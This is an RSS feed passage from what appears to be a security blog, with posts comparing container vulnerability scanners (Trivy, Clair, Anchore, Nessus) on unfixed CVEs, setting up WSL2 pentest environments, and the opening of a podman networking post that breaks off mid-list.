<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>When is a Vulnerability (possibly) not a vulnerability</title>
				<description>&lt;p&gt;Over the last couple of months I’ve been looking at container vulnerability scanning a bit (some more info &lt;a href=&quot;https://raesene.github.io/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/&quot;&gt;here&lt;/a&gt;), and there  was one behaviour I noticed that’s probably worth commenting on, as it can be a bit unexpected, and that’s the handling of unfixed vulnerbilities.&lt;/p&gt;

&lt;p&gt;Some Linux distributions (e.g. Debian or Ubuntu) will release information about CVEs for which there is no released patched package, and so you get the question of “should a vulnerability scanner report those?”. On the one hand, it’s good for organizations to know about all their vulnerabilities. On the other hand, from a compliance standpoint, having a large number of unpatchable vulnerabilities can be awkward!&lt;/p&gt;

&lt;p&gt;Whilst this behaviour isn’t unique to containers, I came across it when investigating the differences between the results of different container scanning engines when run against Docker Hub official images. Some tools, for example Nessus and Nexpose would report 0 issues, whilst others, such as Trivy or Clair would report relatively large numbers. As far as I can tell, what’s happening is that Nessus/Nexpose take the approach of not flagging unpatched vulnerabilities where Trivy and Clair default to flagging them.&lt;/p&gt;

&lt;p&gt;I was wondering how to replicate this as Nessus’ container scanning service is not availble for free, however luckily you can use Trivy to scan a Virtual Machine image, so we can test it that way and use the free Nessus Essentials for comparison. For this test, I got an Ubuntu 18.04 server image, updated it fully and ran Nessus and Trivy against it.&lt;/p&gt;

&lt;p&gt;A Nessus scan using credentials to allow patch checking, showed 0 unpatched vulnerabilities. Trivy by default showed 242 vulnerabilities as shown below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;trivy fs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /
2020-11-21T21:16:57.492Z        INFO    Detecting Ubuntu vulnerabilities...

trivyubu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu 18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt;
Total: 242 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN: 0, LOW: 178, MEDIUM: 64, HIGH: 0, CRITICAL: 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Helpfully, Trivy provides an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--ignore-unfixed&lt;/code&gt; option, which demonstrates that what we’re seeing is unpatched issues, as with that flag we get back 0.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rorym@trivyubu:~/trivy_output&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;trivy fs &lt;span class=&quot;nt&quot;&gt;--ignore-unfixed&lt;/span&gt; /
2020-11-21T21:17:16.931Z        INFO    Detecting Ubuntu vulnerabilities...

trivyubu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu 18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt;
Total: 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So the question is, which one’s right? I’d say (like most things in security) that depends! For most organizations, you probably don’t want to manually patch and compile packages, so you may want to use a container scanner that supports functionality to ignore unfixed issues. This also gives you comparable scanning to the output you’re likely getting from your Virtual Machine vulnerability scanning efforts.&lt;/p&gt;

&lt;p&gt;For higher risk deployments, you might want to review the package lists and ensure that you’re comfortable leaving those issues unpatched.&lt;/p&gt;

&lt;p&gt;Of course, mitigations like minimizing the number of installed packages and looking at distroless or scratch containers, could also help reduce this kind of problem.&lt;/p&gt;
</description>
				<pubDate>Sun, 22 Nov 2020 11:10:39 +0000</pubDate>
				<link>/blog/2020/11/22/When_Is_A_Vulnerability_Not_A_Vulnerability/</link>
				<guid isPermaLink="true">/blog/2020/11/22/When_Is_A_Vulnerability_Not_A_Vulnerability/</guid>
			</item>
		
			<item>
				<title>Container Vulnerability Scanning Fun</title>
				<description>&lt;p&gt;Vulnerability Assessment is one of those foundational IT Security tasks that often gets overlooked or thought to be reasonably straightforward, where you can actually find some interesting complications that make it trickier than expected.&lt;/p&gt;

&lt;p&gt;Generally, most companies will include VA as part of their overall operational security processes, looking to assure that the software they’re deploying is relatively free of unpatched security vulnerabilities.&lt;/p&gt;

&lt;p&gt;This post will look a bit at how assessing vulnerabilities of container images for outdated operating system packages is handled and some things to be aware of. We’ll exclude Windows container images to keep things (relatively) straightforward and stick to operating system level vulnerabilities.&lt;/p&gt;

&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;

&lt;p&gt;Most Docker images are based on specific Linux distributions and make use of the package managers that those distributions provide to deploy software like tooling and libraries that support the application running in containers based on that image.&lt;/p&gt;

&lt;p&gt;So if we’re looking to assess whether there are known vulnerabilities in our images, it would seem possible to use the data provided by the distributions about package versions and CVEs that are patched in them, to assess whether a given image has unpatched vulnerabilities, so far … so simple!&lt;/p&gt;

&lt;h2 id=&quot;tooling&quot;&gt;Tooling&lt;/h2&gt;

&lt;p&gt;To take a practical look at how this works, we can use some of the Open Source container vulnerability scanning tools that are available.  For this post we’ll look at three&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/anchore/anchore-engine&quot;&gt;Anchore Engine&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/quay/clair&quot;&gt;Clair&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/aquasecurity/trivy&quot;&gt;Trivy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the examples below, I set up all three scanners to run locally (e.g. without setting up a container registry).  For Anchore I used their Docker compose file and &lt;a href=&quot;https://github.com/anchore/anchore-cli&quot;&gt;Ancore CLI&lt;/a&gt;, for clair I used &lt;a href=&quot;https://github.com/arminc/clair-local-scan&quot;&gt;clair-local-scan&lt;/a&gt; and for Trivy, I just used the binary as it comes from their repo. A side note on these is that, from the perspective of setup processes for standalone usage, Trivy is by far the easiest to get working.&lt;/p&gt;

&lt;h2 id=&quot;scanning-common-base-images&quot;&gt;Scanning Common Base Images&lt;/h2&gt;

&lt;p&gt;So now we’ve got three scanners setup, let’s take a look at some common base images and see what they come up with. All three tools provide a JSON output option, so we can use that to create parseable results for analysis.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL;DR.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you don’t want to read down a couple of points to note&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Despite the task seeming relatively simple, even in base images different container vulnerability scanners produce quite different results&lt;/li&gt;
  &lt;li&gt;The scanning engines support different sets of base images, so that should be noted when you’re assessing which one to use&lt;/li&gt;
  &lt;li&gt;Even in a fully updated base image, there can still be outstanding CVEs, depending on the update cycle of both Docker Hub and the underlying distribution.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Summary of Vulnerability Numbers&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Ubuntu:18.04&lt;/th&gt;
      &lt;th&gt;Ubuntu:20.04&lt;/th&gt;
      &lt;th&gt;Debian:stable&lt;/th&gt;
      &lt;th&gt;Centos:8&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Anchore&lt;/td&gt;
      &lt;td&gt;71&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;47&lt;/td&gt;
      &lt;td&gt;74&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Clair&lt;/td&gt;
      &lt;td&gt;38&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;89&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Trivy&lt;/td&gt;
      &lt;td&gt;73&lt;/td&gt;
      &lt;td&gt;26&lt;/td&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;N/A&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;result-details&quot;&gt;Result Details&lt;/h1&gt;

&lt;h2 id=&quot;ubuntu1804&quot;&gt;Ubuntu:18.04&lt;/h2&gt;

&lt;p&gt;This is a very commonly used base image.  We’re using the latest version with that tag from Docker Hub.  First question is, when we scan this image, how many vulnerabilities does each scanner think we have?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 71
Clair thinks the vuln count is : 38
Trivy thinks the vuln count is : 73
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is moderately interesting already.  If you’re using an updated image from Docker Hub, you might think there would be no unpatched issues, but you’d be wrong. One interesting piece about these issue counts is that (in this case) it turns out that the CVEs referenced are the same but that some of the scanners have multiple vulnerabilities for a single CVE.&lt;/p&gt;

&lt;p&gt;Next question, what severity do the various scanners apply to these vulnerabilities&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;31, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;17&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;11, &lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;20, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;55, &lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;18&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Some relatively major differences there too.&lt;/p&gt;

&lt;h2 id=&quot;ubuntu2004&quot;&gt;Ubuntu:20.04&lt;/h2&gt;

&lt;p&gt;Lets try the newest stable release of Ubuntu and see what that shows up. Here, Clair doesn’t notice any issues whilst both Anchore and Trivy report over twenty&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 23
Clair thinks the vuln count is : 0
Trivy thinks the vuln count is : 26
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On severities, Trivy includes a high, where all of Anchore’s severities are medium or low.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;11, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;5, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;7&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;9, &lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;16, &lt;span class=&quot;s2&quot;&gt;&quot;HIGH&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;debianstable&quot;&gt;Debian:stable&lt;/h2&gt;

&lt;p&gt;Here the numbers are switched around again with Clair and Trivy reporting quite a few more issues than Anchore. An interesting point is that whilst Clair and Trivy’s total vulnerability counts are similar, the referenced CVEs have quite a few differences.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 47
Clair thinks the vuln count is : 89
Trivy thinks the vuln count is : 88
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;46, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;21, &lt;span class=&quot;s2&quot;&gt;&quot;Negligible&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;45, &lt;span class=&quot;s2&quot;&gt;&quot;Unknown&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LOW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;69, &lt;span class=&quot;s2&quot;&gt;&quot;MEDIUM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;17, &lt;span class=&quot;s2&quot;&gt;&quot;HIGH&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;centos8&quot;&gt;Centos:8&lt;/h2&gt;

&lt;p&gt;Another commonly used base image here the results are interesting, in that Trivy doesn’t recognize the OS at all and Anchore comes out with a lot more vulnerabilities than Clair.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Count&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore thinks the vuln count is : 74
Clair thinks the vuln count is : 1
Trivy thinks the vuln count is : 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability Severities&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Anchore Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Low&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;23, &lt;span class=&quot;s2&quot;&gt;&quot;High&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;4, &lt;span class=&quot;s2&quot;&gt;&quot;Medium&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;47&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Clair Severity Counts : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;High&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Trivy Severity Counts : &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
				<pubDate>Sun, 21 Jun 2020 16:10:39 +0100</pubDate>
				<link>/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/</link>
				<guid isPermaLink="true">/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/</guid>
			</item>
		
			<item>
				<title>Custom Pentest Distributions using WSL2</title>
				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;So with the release of Windows 20.04 over the last week, we’ve finally got the opportunity to use WSL2 without being subscribed to Windows Insider.  After upgrading and getting WSL2 setup, I started thinking about how I could use this as part of my standard pentesting workflow.&lt;/p&gt;

&lt;p&gt;One good practice for pentesting is to create a clean environment for every test you do, to avoid data from one test getting picked up in another and to keep your tooling versions clean. Tools like Ansible are very handy for the packaging piece, I’ve got some playbooks for adding container security tooling to an Ubuntu setup &lt;a href=&quot;https://github.com/raesene/container_sec_workstation&quot;&gt;on GitHub&lt;/a&gt;, but that still leaves the creation of the base install.  Also another challenge can be integrating your pentest environment with your main system.&lt;/p&gt;

&lt;p&gt;With these challenges in mind it seemed like WSL2 could make things easier by providing lightweight virtualized environments with good integration with a Windows host.  What we’ll need however is a way to create “template” WSL2 instances.  By default with WSL and WSL2 you install distributions from the Windows store, but that doesn’t quite fit our use case as what I’m looking to do here is create a new one per test.&lt;/p&gt;

&lt;p&gt;Luckily WSL2 is pretty flexible and we can work round this easily. The steps below are based on the process in &lt;a href=&quot;https://winaero.com/blog/export-import-wsl-linux-distro-windows-10/&quot;&gt;this blog&lt;/a&gt;.  From that we can see that it’s possible to import and export root filesystems to create WSL distributions (kind of the same way you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--export&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--import&lt;/code&gt; in Docker)&lt;/p&gt;

&lt;h1 id=&quot;creating-a-custom-distribution&quot;&gt;Creating a Custom Distribution&lt;/h1&gt;

&lt;p&gt;The first thing we’ll need is a root filesystem.  Luckily Ubuntu make their WSL root filesystem available for download, which is availble &lt;a href=&quot;https://cloud-images.ubuntu.com/releases/focal/release/ubuntu-20.04-server-cloudimg-amd64-wsl.rootfs.tar.gz&quot;&gt;here&lt;/a&gt;. For this walkthrough I’ve created a directory on my Windows C: drive called “WSL”, we’ll place the rootfs files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\WSL\wslrootfs&lt;/code&gt; and the distros in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\WSL\wsldistros\&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Download the file above to the wslrootfs directory.&lt;/li&gt;
  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsl.exe --import baseubu C:\wsl\wsldistros\baseubu\ C:\wsl\wslrootfs\ubuntu-20.04-server-cloudimg-amd64-wsl.rootfs.tar.gz&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baseubu&lt;/code&gt; Is just a name you want to assign so for example a specific project. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\wsl\wsldistros\baseubu\&lt;/code&gt; is the directory on your machine you want to place the virtual disk file for the distribution and then we have the distro file we downloaded&lt;/p&gt;

&lt;p&gt;At this point you have a clean install of ubuntu 20.04 to use. You can then easily access each distribution you have available with Windows Terminal which places them all on a tab drop-down for easy access.&lt;/p&gt;

&lt;h1 id=&quot;adding-docker-into-our-distribution&quot;&gt;Adding Docker into our distribution&lt;/h1&gt;

&lt;p&gt;If you’ve got &lt;a href=&quot;https://docs.docker.com/docker-for-windows/&quot;&gt;Docker for Windows&lt;/a&gt; installed, you can also easily integrate it into this environment, so you can get all your favourite container based goodies working.  To do this, go into Docker’s settings, go to Resources–&amp;gt; WSL Integration.  You’ll see a list of your distributions, including the one you’ve just imported.  Flick the slider next to it to “on” , then click “apply and restart” and all your docker commands should work just fine then next time you start a session with that distro.&lt;/p&gt;

&lt;h1 id=&quot;visual-studio-code-integration&quot;&gt;Visual Studio Code Integration&lt;/h1&gt;

&lt;p&gt;Another nice Add-On that WSL2 brings is integration with &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;Visual Studio Code&lt;/a&gt;.  This means that the filesystem that VS Code sees is your WSL2 distro and you can open a terminal inside VS Code that works inside the distro too. For this just install the “Remote - WSL” plugin, then you can use the “Remote Explorer” button on the left hand side of the VS Code Window, to open a directory inside WSL.&lt;/p&gt;

&lt;p&gt;You can also get other VS Code plugins working inside the WSL environment, so things like the Docker and Kubernetes plugins can be installed and will work from that perspective too.&lt;/p&gt;

&lt;h1 id=&quot;host-filesystem-integration&quot;&gt;Host Filesystem Integration&lt;/h1&gt;

&lt;p&gt;In common with WSL1 the host’s filesystem is visible inside the distro. It’ll be mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/c/&lt;/code&gt; so you can easily copy files into and out of the environment.&lt;/p&gt;

&lt;h1 id=&quot;customizing-our-distribution-for-container-work&quot;&gt;Customizing our Distribution for Container Work&lt;/h1&gt;

&lt;p&gt;Once we’re up and running we can customize our environment for the test type we’re using.  I’m using some ansible playbooks for this from &lt;a href=&quot;https://github.com/raesene/container_sec_workstation&quot;&gt;this repo&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Install ansible first.  If you’re using Ubuntu 20.04 you can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update &amp;amp;&amp;amp; apt install -y ansible&lt;/code&gt; to get that working&lt;/li&gt;
  &lt;li&gt;Then run the playbook &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible-playbook wsl_container_workstation.yml&lt;/code&gt; and it sets up the necessary tooling&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;using-our-wsl-distro-as-a-template&quot;&gt;Using our WSL distro as a template&lt;/h1&gt;

&lt;p&gt;Now that we’ve got the tooling we want installed, if we don’t want to re-run the ansible playbook for every test, we can export the rootfs for later use.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wsl --export baseubu c:\wsl\wslrootfs\containersec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can create new instances based off this by importing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containersec&lt;/code&gt; file we just created&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wsl --import test1 c:\wsl\wsldistros\test1\ c:\wsl\wslrootfs\containersec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and when we start it up, all our tools are in place :)&lt;/p&gt;

&lt;h1 id=&quot;cleaning-up&quot;&gt;Cleaning up&lt;/h1&gt;

&lt;p&gt;Once you’re finished with it, it can just be removed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsl.exe --unregister &amp;lt;Name&amp;gt;&lt;/code&gt;. This will delete the virtual disk file and leave everything nice and clean.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;Overall I think that WSL2 along with Windows Terminal, Visual Studio Code, and Docker for Windows, can provide a very nice Linux based environment inside a host Windows OS. So for environments where you can’t, or don’t want to, run Linux as your base OS, it becomes fairly easy to set-up your tooling the way you want it to work.&lt;/p&gt;
</description>
				<pubDate>Sun, 31 May 2020 11:10:39 +0100</pubDate>
				<link>/blog/2020/05/31/Custom_Pentest_Distributions_With_WSL2/</link>
				<guid isPermaLink="true">/blog/2020/05/31/Custom_Pentest_Distributions_With_WSL2/</guid>
			</item>
		
			<item>
				<title>More Podman - Rootfull containers, Networking and processes</title>
				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This is a follow on from my &lt;a href=&quot;https://raesene.github.io/blog/2020/02/01/Comparing-Docker-And-Podman/&quot;&gt;previous post&lt;/a&gt; which started looking at how podman varies from running local containers with Docker.&lt;/p&gt;

&lt;p&gt;One point that was raised after that post, was that podman can run containers as root as well, and that’s an interesting area to explore.&lt;/p&gt;

&lt;h2 id=&quot;running-podman-as-root&quot;&gt;Running podman as root&lt;/h2&gt;

&lt;p&gt;So we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; on an ubuntu host to run podman containers as the root user. There’s a couple of reasons you might want to do this.  First up would be that you need access to functions that are not available to your standard user (for example binding ports &amp;lt; 1024), another could be down to the differences in network behaviour between rootless and rootfull containers.&lt;/p&gt;

&lt;p&gt;One thing you’ll notice immediately when using sudo to run podman containers is that, you’re not sharing any container images with your ordinary user, so it’ll pull down images that aren’t present for the root user.&lt;/p&gt;

&lt;p&gt;Unlike Docker there’s no shared system level image repository, by default, so it will go and retrieve images where needed.&lt;/p&gt;

&lt;h2 id=&quot;difference-in-networking---rootless-vs-rootfull&quot;&gt;Difference in networking - rootless v.s. rootfull&lt;/h2&gt;

&lt;p&gt;Another area where there are some notable differences between rootless and rootfull containers under podman is in networking.  As mentioned last time rootless containers use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; to provide containers an IP address.  This is quite a different model to the Docker bridge, with a couple of practical effects.&lt;/p&gt;

&lt;ul&gt;
